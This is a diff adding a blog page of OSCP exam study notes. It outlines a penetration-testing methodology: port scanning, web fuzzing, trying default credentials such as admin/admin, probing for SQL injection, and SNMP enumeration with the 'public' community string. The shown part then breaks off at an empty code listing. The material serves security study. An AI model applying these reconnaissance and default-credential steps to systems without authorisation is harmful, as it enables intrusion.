@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>
+OSCP tips, commands, and random things | d0xFF
+</title>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="generator" content="Hugo 0.147.2">
+
+
+<link rel="canonical" href="http://localhost:1313/post/oscp-commands-and-tricks/" >
+<link href="/sass/main.min.7b717d09afc95cbb2024b3c24ce8e5ad32541e0cb77effe6a7aae21534367b0d.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<link rel="stylesheet" href="/js/custom-highlight.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="/js/highlight-init.js"></script>
+<script src="/js/highlight-bash-args.js"></script>
+
+</head>
+
+<body>
+    <div class="flexWrapper">
+        <header class="header">
+    <div class="wrapper">
+        <a href="http://localhost:1313/">
+            <span class="terminal">hello_world@rose-pine ~ $</span>
+            <span class="cursor"></span>
+        </a>
+        <div class="menu">
+            <input type="checkbox" class="menu-toggle" id="menu-toggle" />
+            <nav class="menu-items">
+                <ul>
+                    
+                    
+                    <li>
+                     
+                      
+                      
+                        <a href="/about"  title="" >
+                            ~/about</a>
+                    </li>
+                    
+                    <li>
+                     
+                      
+                      
+                        <a href="/notes"  title="" >
+                            ~/notes</a>
+                    </li>
+                    
+                    <li>
+                     
+                      
+                      
+                        <a href="/posts"  title="" >
+                            ~/posts</a>
+                    </li>
+                    
+                </ul>
+            </nav>
+            <label for="menu-toggle" class="menu-trigger">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M0 0h24v24H0z" fill="none" />
+                    <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+                </svg>
+            </label>
+        </div>
+    </div>
+</header>
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper post">
+    <h1>OSCP tips, commands, and random things</h1>
+    <div class="postMeta">
+        
+        <span>May 25, 2025</span>
+        
+        
+    </div><h1 id="methodology">Methodology</h1>
+<p>You&rsquo;ll see people mention it time and time again. As you draw closer to the exam, you need to focus on developing your methodology if you haven&rsquo;t. Having a methodical approach to each box, can help ensure that you don&rsquo;t miss things. A process of checking for all the basic things, the same way, on every new box. Your methodology can get very in the weeds, or can be more high-level. Just try to ensure that you&rsquo;re doing all your checks, at every step, <em>every</em> time.</p>
+<h2 id="my-methodology">My Methodology</h2>
+<ol>
+<li>Start scan of all tcp ports</li>
+<li>Scan &ldquo;useful&rdquo; udp ports, such as 161</li>
+<li>If web ports were found in the tcp scan, start fuzzing the ports
+<ul>
+<li>While fuzzing, use firefox and browse to the web ports.
+<ul>
+<li>Looking for</li>
+<li>default creds <code>admin / admin</code></li>
+<li>SQLi possibility</li>
+<li>Information Disclosure</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>If SNMP is open
+<ul>
+<li><code>snmpwalk</code> with &ldquo;public&rdquo; as a community string</li>
+</ul>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="hl-0-1"><a class="lnlinks" href="#hl-0-1">  1</a>
+</span><span class="lnt" id="hl-0-2"><a class="lnlinks" href="#hl-0-2">  2</a>
+</span><span class="lnt" id="hl-0-3"><a class="lnlinks" href="#hl-0-3">  3</a>
+</span><span class="lnt" id="hl-0-4"><a class="lnlinks" href="#hl-0-4">  4</a>
+</span><span class="lnt" id="hl-0-5"><a class="lnlinks" href="#hl-0-5">  5</a>
+</span><span class="lnt" id="hl-0-6"><a class="lnlinks" href="#hl-0-6">  6</a>
+</span><span class="lnt" id="hl-0-7"><a class="lnlinks" href="#hl-0-7">  7</a>
+</span><span class="lnt" id="hl-0-8"><a class="lnlinks" href="#hl-0-8">  8</a>
+</span><span class="lnt" id="hl-0-9"><a class="lnlinks" href="#hl-0-9">  9</a>
+</span><span class="lnt" id="hl-0-10"><a class="lnlinks" href="#hl-0-10"> 10</a>
+</span><span class="lnt" id="hl-0-11"><a class="lnlinks" href="#hl-0-11"> 11</a>
+</span><span class="lnt" id="hl-0-12"><a class="lnlinks" href="#hl-0-12"> 12</a>
+</span><span class="lnt" id="hl-0-13"><a class="lnlinks" href="#hl-0-13"> 13</a>
+</span><span class="lnt" id="hl-0-14"><a class="lnlinks" href="#hl-0-14"> 14</a>
+</span><span class="lnt" id="hl-0-15"><a class="lnlinks" href="#hl-0-15"> 15</a>
+</span><span class="lnt" id="hl-0-16"><a class="lnlinks" href="#hl-0-16"> 16</a>
+</span><span class="lnt" id="hl-0-17"><a class="lnlinks" href="#hl-0-17"> 17</a>
+</span><span class="lnt" id="hl-0-18"><a class="lnlinks" href="#hl-0-18"> 18</a>
+</span><span class="lnt" id="hl-0-19"><a class="lnlinks" href="#hl-0-19"> 19</a>
+</span><span class="lnt" id="hl-0-20"><a class="lnlinks" href="#hl-0-20"> 20</a>
+</span><span class="lnt" id="hl-0-21"><a class="lnlinks" href="#hl-0-21"> 21</a>
+</span><span class="lnt" id="hl-0-22"><a class="lnlinks" href="#hl-0-22"> 22</a>
+</span><span class="lnt" id="hl-0-23"><a class="lnlinks" href="#hl-0-23"> 23</a>
+</span><span class="lnt" id="hl-0-24"><a class="lnlinks" href="#hl-0-24"> 24</a>
+</span><span class="lnt" id="hl-0-25"><a class="lnlinks" href="#hl-0-25"> 25</a>
+</span><span class="lnt" id="hl-0-26"><a class="lnlinks" href="#hl-0-26"> 26</a>
+</span><span class="lnt" id="hl-0-27"><a class="lnlinks" href="#hl-0-27"> 27</a>
+</span><span class="lnt" id="hl-0-28"><a class="lnlinks" href="#hl-0-28"> 28</a>
+</span><span class="lnt" id="hl-0-29"><a class="lnlinks" href="#hl-0-29"> 29</a>
+</span><span class="lnt" id="hl-0-30"><a class="lnlinks" href="#hl-0-30"> 30</a>
+</span><span class="lnt" id="hl-0-31"><a class="lnlinks" href="#hl-0-31"> 31</a>
+</span><span class="lnt" id="hl-0-32"><a class="lnlinks" href="#hl-0-32"> 32</a>
+</span><span class="lnt" id="hl-0-33"><a class="lnlinks" href="#hl-0-33"> 33</a>
+</span><span class="lnt" id="hl-0-34"><a class="lnlinks" href="#hl-0-34"> 34</a>
+</span><span class="lnt" id="hl-0-35"><a class="lnlinks" href="#hl-0-35"> 35</a>
+</span><span class="lnt" id="hl-0-36"><a class="lnlinks" href="#hl-0-36"> 36</a>
+</span><span class="lnt" id="hl-0-37"><a class="lnlinks" href="#hl-0-37"> 37</a>
+</span><span class="lnt" id="hl-0-38"><a class="lnlinks" href="#hl-0-38"> 38</a>
+</span><span class="lnt" id="hl-0-39"><a class="lnlinks" href="#hl-0-39"> 39</a>
+</span><span class="lnt" id="hl-0-40"><a class="lnlinks" href="#hl-0-40"> 40</a>
+</span><span class="lnt" id="hl-0-41"><a class="lnlinks" href="#hl-0-41"> 41</a>
+</span><span class="lnt" id="hl-0-42"><a class="lnlinks" href="#hl-0-42"> 42</a>
+</span><span class="lnt" id="hl-0-43"><a class="lnlinks" href="#hl-0-43"> 43</a>
+</span><span class="lnt" id="hl-0-44"><a class="lnlinks" href="#hl-0-44"> 44</a>
+</span><span class="lnt" id="hl-0-45"><a class="lnlinks" href="#hl-0-45"> 45</a>
+</span><span class="lnt" id="hl-0-46"><a class="lnlinks" href="#hl-0-46"> 46</a>
+</span><span class="lnt" id="hl-0-47"><a class="lnlinks" href="#hl-0-47"> 47</a>
+</span><span class="lnt" id="hl-0-48"><a class="lnlinks" href="#hl-0-48"> 48</a>
+</span><span class="lnt" id="hl-0-49"><a class="lnlinks" href="#hl-0-49"> 49</a>
+</span><span class="lnt" id="hl-0-50"><a class="lnlinks" href="#hl-0-50"> 50</a>
+</span><span class="lnt" id="hl-0-51"><a class="lnlinks" href="#hl-0-51"> 51</a>
+</span><span class="lnt" id="hl-0-52"><a class="lnlinks" href="#hl-0-52"> 52</a>
+</span><span class="lnt" id="hl-0-53"><a class="lnlinks" href="#hl-0-53"> 53</a>
+</span><span class="lnt" id="hl-0-54"><a class="lnlinks" href="#hl-0-54"> 54</a>
+</span><span class="lnt" id="hl-0-55"><a class="lnlinks" href="#hl-0-55"> 55</a>
+</span><span class="lnt" id="hl-0-56"><a class="lnlinks" href="#hl-0-56"> 56</a>
+</span><span class="lnt" id="hl-0-57"><a class="lnlinks" href="#hl-0-57"> 57</a>
+</span><span class="lnt" id="hl-0-58"><a class="lnlinks" href="#hl-0-58"> 58</a>
+</span><span class="lnt" id="hl-0-59"><a class="lnlinks" href="#hl-0-59"> 59</a>
+</span><span class="lnt" id="hl-0-60"><a class="lnlinks" href="#hl-0-60"> 60</a>
+</span><span class="lnt" id="hl-0-61"><a class="lnlinks" href="#hl-0-61"> 61</a>
+</span><span class="lnt" id="hl-0-62"><a class="lnlinks" href="#hl-0-62"> 62</a>
+</span><span class="lnt" id="hl-0-63"><a class="lnlinks" href="#hl-0-63"> 63</a>
+</span><span class="lnt" id="hl-0-64"><a class="lnlinks" href="#hl-0-64"> 64</a>
+</span><span class="lnt" id="hl-0-65"><a class="lnlinks" href="#hl-0-65"> 65</a>
+</span><span class="lnt" id="hl-0-66"><a class="lnlinks" href="#hl-0-66"> 66</a>
+</span><span class="lnt" id="hl-0-67"><a class="lnlinks" href="#hl-0-67"> 67</a>
+</span><span class="lnt" id="hl-0-68"><a class="lnlinks" href="#hl-0-68"> 68</a>
+</span><span class="lnt" id="hl-0-69"><a class="lnlinks" href="#hl-0-69"> 69</a>
+</span><span class="lnt" id="hl-0-70"><a class="lnlinks" href="#hl-0-70"> 70</a>
+</span><span class="lnt" id="hl-0-71"><a class="lnlinks" href="#hl-0-71"> 71</a>
+</span><span class="lnt" id="hl-0-72"><a class="lnlinks" href="#hl-0-72"> 72</a>
+</span><span class="lnt" id="hl-0-73"><a class="lnlinks" href="#hl-0-73"> 73</a>
+</span><span class="lnt" id="hl-0-74"><a class="lnlinks" href="#hl-0-74"> 74</a>
+</span><span class="lnt" id="hl-0-75"><a class="lnlinks" href="#hl-0-75"> 75</a>
+</span><span class="lnt" id="hl-0-76"><a class="lnlinks" href="#hl-0-76"> 76</a>
+</span><span class="lnt" id="hl-0-77"><a class="lnlinks" href="#hl-0-77"> 77</a>
+</span><span class="lnt" id="hl-0-78"><a class="lnlinks" href="#hl-0-78"> 78</a>
+</span><span class="lnt" id="hl-0-79"><a class="lnlinks" href="#hl-0-79"> 79</a>
+</span><span class="lnt" id="hl-0-80"><a class="lnlinks" href="#hl-0-80"> 80</a>
+</span><span class="lnt" id="hl-0-81"><a class="lnlinks" href="#hl-0-81"> 81</a>
+</span><span class="lnt" id="hl-0-82"><a class="lnlinks" href="#hl-0-82"> 82</a>
+</span><span class="lnt" id="hl-0-83"><a class="lnlinks" href="#hl-0-83"> 83</a>
+</span><span class="lnt" id="hl-0-84"><a class="lnlinks" href="#hl-0-84"> 84</a>
+</span><span class="lnt" id="hl-0-85"><a class="lnlinks" href="#hl-0-85"> 85</a>
+</span><span class="lnt" id="hl-0-86"><a class="lnlinks" href="#hl-0-86"> 86</a>
+</span><span class="lnt" id="hl-0-87"><a class="lnlinks" href="#hl-0-87"> 87</a>
+</span><span class="lnt" id="hl-0-88"><a class="lnlinks" href="#hl-0-88"> 88</a>
+</span><span class="lnt" id="hl-0-89"><a class="lnlinks" href="#hl-0-89"> 89</a>
+</span><span class="lnt" id="hl-0-90"><a class="lnlinks" href="#hl-0-90"> 90</a>
+</span><span class="lnt" id="hl-0-91"><a class="lnlinks" href="#hl-0-91"> 91</a>
+</span><span class="lnt" id="hl-0-92"><a class="lnlinks" href="#hl-0-92"> 92</a>
+</span><span class="lnt" id="hl-0-93"><a class="lnlinks" href="#hl-0-93"> 93</a>
+</span><span class="lnt" id="hl-0-94"><a class="lnlinks" href="#hl-0-94"> 94</a>
+</span><span class="lnt" id="hl-0-95"><a class="lnlinks" href="#hl-0-95"> 95</a>
+</span><span class="lnt" id="hl-0-96"><a class="lnlinks" href="#hl-0-96"> 96</a>
+</span><span class="lnt" id="hl-0-97"><a class="lnlinks" href="#hl-0-97"> 97</a>
+</span><span class="lnt" id="hl-0-98"><a class="lnlinks" href="#hl-0-98"> 98</a>
+</span><span class="lnt" id="hl-0-99"><a class="lnlinks" href="#hl-0-99"> 99</a>
+</span><span class="lnt" id="hl-0-100"><a class="lnlinks" href="#hl-0-100">100</a>
+</span><span class="lnt" id="hl-0-101"><a class="lnlinks" href="#hl-0-101">101</a>
+</span><span class="lnt" id="hl-0-102"><a class="lnlinks" href="#hl-0-102">102</a>
+</span><span class="lnt" id="hl-0-103"><a class="lnlinks" href="#hl-0-103">103</a>
+</span><span class="lnt" id="hl-0-104"><a class="lnlinks" href="#hl-0-104">104</a>
+</span><span class="lnt" id="hl-0-105"><a class="lnlinks" href="#hl-0-105">105</a>
+</span><span class="lnt" id="hl-0-106"><a class="lnlinks" href="#hl-0-106">106</a>
+</span><span class="lnt" id="hl-0-107"><a class="lnlinks" href="#hl-0-107">107</a>
+</span><span class="lnt" id="hl-0-108"><a class="lnlinks" href="#hl-0-108">108</a>
+</span><span class="lnt" id="hl-0-109"><a class="lnlinks" href="#hl-0-109">109</a>
+</span><span class="lnt" id="hl-0-110"><a class="lnlinks" href="#hl-0-110">110</a>
+</span><span class="lnt" id="hl-0-111"><a class="lnlinks" href="#hl-0-111">111</a>
+</span><span class="lnt" id="hl-0-112"><a class="lnlinks" href="#hl-0-112">112</a>
+</span><span class="lnt" id="hl-0-113"><a class="lnlinks" href="#hl-0-113">113</a>
+</span><span class="lnt" id="hl-0-114"><a class="lnlinks" href="#hl-0-114">114</a>
+</span><span class="lnt" id="hl-0-115"><a class="lnlinks" href="#hl-0-115">115</a>
+</span><span class="lnt" id="hl-0-116"><a class="lnlinks" href="#hl-0-116">116</a>
+</span><span class="lnt" id="hl-0-117"><a class="lnlinks" href="#hl-0-117">117</a>
+</span><span class="lnt" id="hl-0-118"><a class="lnlinks" href="#hl-0-118">118</a>
+</span><span class="lnt" id="hl-0-119"><a class="lnlinks" href="#hl-0-119">119</a>
+</span><span class="lnt" id="hl-0-120"><a class="lnlinks" href="#hl-0-120">120</a>
+</span><span class="lnt" id="hl-0-121"><a class="lnlinks" href="#hl-0-121">121</a>
+</span><span class="lnt" id="hl-0-122"><a class="lnlinks" href="#hl-0-122">122</a>
+</span><span class="lnt" id="hl-0-123"><a class="lnlinks" href="#hl-0-123">123</a>
+</span><span class="lnt" id="hl-0-124"><a class="lnlinks" href="#hl-0-124">124</a>
+</span><span class="lnt" id="hl-0-125"><a class="lnlinks" href="#hl-0-125">125</a>
+</span><span class="lnt" id="hl-0-126"><a class="lnlinks" href="#hl-0-126">126</a>
+</span><span class="lnt" id="hl-0-127"><a class="lnlinks" href="#hl-0-127">127</a>
+</span><span class="lnt" id="hl-0-128"><a class="lnlinks" href="#hl-0-128">128</a>
+</span><span class="lnt" id="hl-0-129"><a class="lnlinks" href="#hl-0-129">129</a>
+</span><span class="lnt" id="hl-0-130"><a class="lnlinks" href="#hl-0-130">130</a>
+</span><span class="lnt" id="hl-0-131"><a class="lnlinks" href="#hl-0-131">131</a>
+</span><span class="lnt" id="hl-0-132"><a class="lnlinks" href="#hl-0-132">132</a>
+</span><span class="lnt" id="hl-0-133"><a class="lnlinks" href="#hl-0-133">133</a>
+</span><span class="lnt" id="hl-0-134"><a class="lnlinks" href="#hl-0-134">134</a>
+</span><span class="lnt" id="hl-0-135"><a class="lnlinks" href="#hl-0-135">135</a>
+</span><span class="lnt" id="hl-0-136"><a class="lnlinks" href="#hl-0-136">136</a>
+</span><span class="lnt" id="hl-0-137"><a class="lnlinks" href="#hl-0-137">137</a>
+</span><span class="lnt" id="hl-0-138"><a class="lnlinks" href="#hl-0-138">138</a>
+</span><span class="lnt" id="hl-0-139"><a class="lnlinks" href="#hl-0-139">139</a>
+</span><span class="lnt" id="hl-0-140"><a class="lnlinks" href="#hl-0-140">140</a>
+</span><span class="lnt" id="hl-0-141"><a class="lnlinks" href="#hl-0-141">141</a>
+</span><span class="lnt" id="hl-0-142"><a class="lnlinks" href="#hl-0-142">142</a>
+</span><span class="lnt" id="hl-0-143"><a class="lnlinks" href="#hl-0-143">143</a>
+</span><span class="lnt" id="hl-0-144"><a class="lnlinks" href="#hl-0-144">144</a>
+</span><span class="lnt" id="hl-0-145"><a class="lnlinks" href="#hl-0-145">145</a>
+</span><span class="lnt" id="hl-0-146"><a class="lnlinks" href="#hl-0-146">146</a>
+</span><span class="lnt" id="hl-0-147"><a class="lnlinks" href="#hl-0-147">147</a>
+</span><span class="lnt" id="hl-0-148"><a class="lnlinks" href="#hl-0-148">148</a>
+</span><span class="lnt" id="hl-0-149"><a class="lnlinks" href="#hl-0-149">149</a>
+</span><span class="lnt" id="hl-0-150"><a class="lnlinks" href="#hl-0-150">150</a>
+</span><span class="lnt" id="hl-0-151"><a class="lnlinks" href="#hl-0-151">151</a>
+</span><span class="lnt" id="hl-0-152"><a class="lnlinks" href="#hl-0-152">152</a>
+</span><span class="lnt" id="hl-0-153"><a class="lnlinks" href="#hl-0-153">153</a>
+</span><span class="lnt" id="hl-0-154"><a class="lnlinks" href="#hl-0-154">154</a>
+</span><span class="lnt" id="hl-0-155"><a class="lnlinks" href="#hl-0-155">155</a>
+</span><span class="lnt" id="hl-0-156"><a class="lnlinks" href="#hl-0-156">156</a>
+</span><span class="lnt" id="hl-0-157"><a class="lnlinks" href="#hl-0-157">157</a>
+</span><span class="lnt" id="hl-0-158"><a class="lnlinks" href="#hl-0-158">158</a>
+</span><span class="lnt" id="hl-0-159"><a class="lnlinks" href="#hl-0-159">159</a>
+</span><span class="lnt" id="hl-0-160"><a class="lnlinks" href="#hl-0-160">160</a>
+</span><span class="lnt" id="hl-0-161"><a class="lnlinks" href="#hl-0-161">161</a>
+</span><span class="lnt" id="hl-0-162"><a class="lnlinks" href="#hl-0-162">162</a>
+</span><span class="lnt" id="hl-0-163"><a class="lnlinks" href="#hl-0-163">163</a>
+</span><span class="lnt" id="hl-0-164"><a class="lnlinks" href="#hl-0-164">164</a>
+</span><span class="lnt" id="hl-0-165"><a class="lnlinks" href="#hl-0-165">165</a>
+</span><span class="lnt" id="hl-0-166"><a class="lnlinks" href="#hl-0-166">166</a>
+</span><span class="lnt" id="hl-0-167"><a class="lnlinks" href="#hl-0-167">167</a>
+</span><span class="lnt" id="hl-0-168"><a class="lnlinks" href="#hl-0-168">168</a>
+</span><span class="lnt" id="hl-0-169"><a class="lnlinks" href="#hl-0-169">169</a>
+</span><span class="lnt" id="hl-0-170"><a class="lnlinks" href="#hl-0-170">170</a>
+</span><span class="lnt" id="hl-0-171"><a class="lnlinks" href="#hl-0-171">171</a>
+</span><span class="lnt" id="hl-0-172"><a class="lnlinks" href="#hl-0-172">172</a>
+</span><span class="lnt" id="hl-0-173"><a class="lnlinks" href="#hl-0-173">173</a>
+</span><span class="lnt" id="hl-0-174"><a class="lnlinks" href="#hl-0-174">174</a>
+</span><span class="lnt" id="hl-0-175"><a class="lnlinks" href="#hl-0-175">175</a>
+</span><span class="lnt" id="hl-0-176"><a class="lnlinks" href="#hl-0-176">176</a>
+</span><span class="lnt" id="hl-0-177"><a class="lnlinks" href="#hl-0-177">177</a>
+</span><span class="lnt" id="hl-0-178"><a class="lnlinks" href="#hl-0-178">178</a>
+</span><span class="lnt" id="hl-0-179"><a class="lnlinks" href="#hl-0-179">179</a>
+</span><span class="lnt" id="hl-0-180"><a class="lnlinks" href="#hl-0-180">180</a>
+</span><span class="lnt" id="hl-0-181"><a class="lnlinks" href="#hl-0-181">181</a>
+</span><span class="lnt" id="hl-0-182"><a class="lnlinks" href="#hl-0-182">182</a>
+</span><span class="lnt" id="hl-0-183"><a class="lnlinks" href="#hl-0-183">183</a>
+</span><span class="lnt" id="hl-0-184"><a class="lnlinks" href="#hl-0-184">184</a>
+</span><span class="lnt" id="hl-0-185"><a class="lnlinks" href="#hl-0-185">185</a>
+</span><span class="lnt" id="hl-0-186"><a class="lnlinks" href="#hl-0-186">186</a>
+</span><span class="lnt" id="hl-0-187"><a class="lnlinks" href="#hl-0-187">187</a>
+</span><span class="lnt" id="hl-0-188"><a class="lnlinks" href="#hl-0-188">188</a>
+</span><span class="lnt" id="hl-0-189"><a class="lnlinks" href="#hl-0-189">189</a>
+</span><span class="lnt" id="hl-0-190"><a class="lnlinks" href="#hl-0-190">190</a>
+</span><span class="lnt" id="hl-0-191"><a class="lnlinks" href="#hl-0-191">191</a>
+</span><span class="lnt" id="hl-0-192"><a class="lnlinks" href="#hl-0-192">192</a>
+</span><span class="lnt" id="hl-0-193"><a class="lnlinks" href="#hl-0-193">193</a>
+</span><span class="lnt" id="hl-0-194"><a class="lnlinks" href="#hl-0-194">194</a>
+</span><span class="lnt" id="hl-0-195"><a class="lnlinks" href="#hl-0-195">195</a>
+</span><span class="lnt" id="hl-0-196"><a class="lnlinks" href="#hl-0-196">196</a>
+</span><span class="lnt" id="hl-0-197"><a class="lnlinks" href="#hl-0-197">197</a>
+</span><span class="lnt" id="hl-0-198"><a class="lnlinks" href="#hl-0-198">198</a>
+</span><span class="lnt" id="hl-0-199"><a class="lnlinks" href="#hl-0-199">199</a>
+</span><span class="lnt" id="hl-0-200"><a class="lnlinks" href="#hl-0-200">200</a>
+</span><span class="lnt" id="hl-0-201"><a class="lnlinks" href="#hl-0-201">201</a>
+</span><span class="lnt" id="hl-0-202"><a class="lnlinks" href="#hl-0-202">202</a>
+</span><span class="lnt" id="hl-0-203"><a class="lnlinks" href="#hl-0-203">203</a>
+</span><span class="lnt" id="hl-0-204"><a class="lnlinks" href="#hl-0-204">204</a>
+</span><span class="lnt" id="hl-0-205"><a class="lnlinks" href="#hl-0-205">205</a>
+</span><span class="lnt" id="hl-0-206"><a class="lnlinks" href="#hl-0-206">206</a>
+</span><span class="lnt" id="hl-0-207"><a class="lnlinks" href="#hl-0-207">207</a>
+</span><span class="lnt" id="hl-0-208"><a class="lnlinks" href="#hl-0-208">208</a>
+</span><span class="lnt" id="hl-0-209"><a class="lnlinks" href="#hl-0-209">209</a>
+</span><span class="lnt" id="hl-0-210"><a class="lnlinks" href="#hl-0-210">210</a>
+</span><span class="lnt" id="hl-0-211"><a class="lnlinks" href="#hl-0-211">211</a>
+</span><span class="lnt" id="hl-0-212"><a class="lnlinks" href="#hl-0-212">212</a>
+</span><span class="lnt" id="hl-0-213"><a class="lnlinks" href="#hl-0-213">213</a>
+</span><span class="lnt" id="hl-0-214"><a class="lnlinks" href="#hl-0-214">214</a>
+</span><span class="lnt" id="hl-0-215"><a class="lnlinks" href="#hl-0-215">215</a>
+</span><span class="lnt" id="hl-0-216"><a class="lnlinks" href="#hl-0-216">216</a>
+</span><span class="lnt" id="hl-0-217"><a class="lnlinks" href="#hl-0-217">217</a>
+</span><span class="lnt" id="hl-0-218"><a class="lnlinks" href="#hl-0-218">218</a>
+</span><span class="lnt" id="hl-0-219"><a class="lnlinks" href="#hl-0-219">219</a>
+</span><span class="lnt" id="hl-0-220"><a class="lnlinks" href="#hl-0-220">220</a>
+</span><span class="lnt" id="hl-0-221"><a class="lnlinks" href="#hl-0-221">221</a>
+</span><span class="lnt" id="hl-0-222"><a class="lnlinks" href="#hl-0-222">222</a>
+</span><span class="lnt" id="hl-0-223"><a class="lnlinks" href="#hl-0-223">223</a>
+</span><span class="lnt" id="hl-0-224"><a class="lnlinks" href="#hl-0-224">224</a>
+</span><span class="lnt" id="hl-0-225"><a class="lnlinks" href="#hl-0-225">225</a>
+</span><span class="lnt" id="hl-0-226"><a class="lnlinks" href="#hl-0-226">226</a>
+</span><span class="lnt" id="hl-0-227"><a class="lnlinks" href="#hl-0-227">227</a>
+</span><span class="lnt" id="hl-0-228"><a class="lnlinks" href="#hl-0-228">228</a>
+</span><span class="lnt" id="hl-0-229"><a class="lnlinks" href="#hl-0-229">229</a>
+</span><span class="lnt" id="hl-0-230"><a class="lnlinks" href="#hl-0-230">230</a>
+</span><span class="lnt" id="hl-0-231"><a class="lnlinks" href="#hl-0-231">231</a>
+</span><span class="lnt" id="hl-0-232"><a class="lnlinks" href="#hl-0-232">232</a>
+</span><span class="lnt" id="hl-0-233"><a class="lnlinks" href="#hl-0-233">233</a>
+</span><span class="lnt" id="hl-0-234"><a class="lnlinks" href="#hl-0-234">234</a>
+</span><span class="lnt" id="hl-0-235"><a class="lnlinks" href="#hl-0-235">235</a>
+</span><span class="lnt" id="hl-0-236"><a class="lnlinks" href="#hl-0-236">236</a>
+</span><span class="lnt" id="hl-0-237"><a class="lnlinks" href="#hl-0-237">237</a>
+</span><span class="lnt" id="hl-0-238"><a class="lnlinks" href="#hl-0-238">238</a>
+</span><span class="lnt" id="hl-0-239"><a class="lnlinks" href="#hl-0-239">239</a>
+</span><span class="lnt" id="hl-0-240"><a class="lnlinks" href="#hl-0-240">240</a>
+</span><span class="lnt" id="hl-0-241"><a class="lnlinks" href="#hl-0-241">241</a>
+</span><span class="lnt" id="hl-0-242"><a class="lnlinks" href="#hl-0-242">242</a>
+</span><span class="lnt" id="hl-0-243"><a class="lnlinks" href="#hl-0-243">243</a>
+</span><span class="lnt" id="hl-0-244"><a class="lnlinks" href="#hl-0-244">244</a>
+</span><span class="lnt" id="hl-0-245"><a class="lnlinks" href="#hl-0-245">245</a>
+</span><span class="lnt" id="hl-0-246"><a class="lnlinks" href="#hl-0-246">246</a>
+</span><span class="lnt" id="hl-0-247"><a class="lnlinks" href="#hl-0-247">247</a>
+</span><span class="lnt" id="hl-0-248"><a class="lnlinks" href="#hl-0-248">248</a>
+</span><span class="lnt" id="hl-0-249"><a class="lnlinks" href="#hl-0-249">249</a>
+</span><span class="lnt" id="hl-0-250"><a class="lnlinks" href="#hl-0-250">250</a>
+</span><span class="lnt" id="hl-0-251"><a class="lnlinks" href="#hl-0-251">251</a>
+</span><span class="lnt" id="hl-0-252"><a class="lnlinks" href="#hl-0-252">252</a>
+</span><span class="lnt" id="hl-0-253"><a class="lnlinks" href="#hl-0-253">253</a>
+</span><span class="lnt" id="hl-0-254"><a class="lnlinks" href="#hl-0-254">254</a>
+</span><span class="lnt" id="hl-0-255"><a class="lnlinks" href="#hl-0-255">255</a>
+</span><span class="lnt" id="hl-0-256"><a class="lnlinks" href="#hl-0-256">256</a>
+</span><span class="lnt" id="hl-0-257"><a class="lnlinks" href="#hl-0-257">257</a>
+</span><span class="lnt" id="hl-0-258"><a class="lnlinks" href="#hl-0-258">258</a>
+</span><span class="lnt" id="hl-0-259"><a class="lnlinks" href="#hl-0-259">259</a>
+</span><span class="lnt" id="hl-0-260"><a class="lnlinks" href="#hl-0-260">260</a>
+</span><span class="lnt" id="hl-0-261"><a class="lnlinks" href="#hl-0-261">261</a>
+</span><span class="lnt" id="hl-0-262"><a class="lnlinks" href="#hl-0-262">262</a>
+</span><span class="lnt" id="hl-0-263"><a class="lnlinks" href="#hl-0-263">263</a>
+</span><span class="lnt" id="hl-0-264"><a class="lnlinks" href="#hl-0-264">264</a>
+</span><span class="lnt" id="hl-0-265"><a class="lnlinks" href="#hl-0-265">265</a>
+</span><span class="lnt" id="hl-0-266"><a class="lnlinks" href="#hl-0-266">266</a>
+</span><span class="lnt" id="hl-0-267"><a class="lnlinks" href="#hl-0-267">267</a>
+</span><span class="lnt" id="hl-0-268"><a class="lnlinks" href="#hl-0-268">268</a>
+</span><span class="lnt" id="hl-0-269"><a class="lnlinks" href="#hl-0-269">269</a>
+</span><span class="lnt" id="hl-0-270"><a class="lnlinks" href="#hl-0-270">270</a>
+</span><span class="lnt" id="hl-0-271"><a class="lnlinks" href="#hl-0-271">271</a>
+</span><span class="lnt" id="hl-0-272"><a class="lnlinks" href="#hl-0-272">272</a>
+</span><span class="lnt" id="hl-0-273"><a class="lnlinks" href="#hl-0-273">273</a>
+</span><span class="lnt" id="hl-0-274"><a class="lnlinks" href="#hl-0-274">274</a>
+</span><span class="lnt" id="hl-0-275"><a class="lnlinks" href="#hl-0-275">275</a>
+</span><span class="lnt" id="hl-0-276"><a class="lnlinks" href="#hl-0-276">276</a>
+</span><span class="lnt" id="hl-0-277"><a class="lnlinks" href="#hl-0-277">277</a>
+</span><span class="lnt" id="hl-0-278"><a class="lnlinks" href="#hl-0-278">278</a>
+</span><span class="lnt" id="hl-0-279"><a class="lnlinks" href="#hl-0-279">279</a>
+</span><span class="lnt" id="hl-0-280"><a class="lnlinks" href="#hl-0-280">280</a>
+</span><span class="lnt" id="hl-0-281"><a class="lnlinks" href="#hl-0-281">281</a>
+</span><span class="lnt" id="hl-0-282"><a class="lnlinks" href="#hl-0-282">282</a>
+</span><span class="lnt" id="hl-0-283"><a class="lnlinks" href="#hl-0-283">283</a>
+</span><span class="lnt" id="hl-0-284"><a class="lnlinks" href="#hl-0-284">284</a>
+</span><span class="lnt" id="hl-0-285"><a class="lnlinks" href="#hl-0-285">285</a>
+</span><span class="lnt" id="hl-0-286"><a class="lnlinks" href="#hl-0-286">286</a>
+</span><span class="lnt" id="hl-0-287"><a class="lnlinks" href="#hl-0-287">287</a>
+</span><span class="lnt" id="hl-0-288"><a class="lnlinks" href="#hl-0-288">288</a>
+</span><span class="lnt" id="hl-0-289"><a class="lnlinks" href="#hl-0-289">289</a>
+</span><span class="lnt" id="hl-0-290"><a class="lnlinks" href="#hl-0-290">290</a>
+</span><span class="lnt" id="hl-0-291"><a class="lnlinks" href="#hl-0-291">291</a>
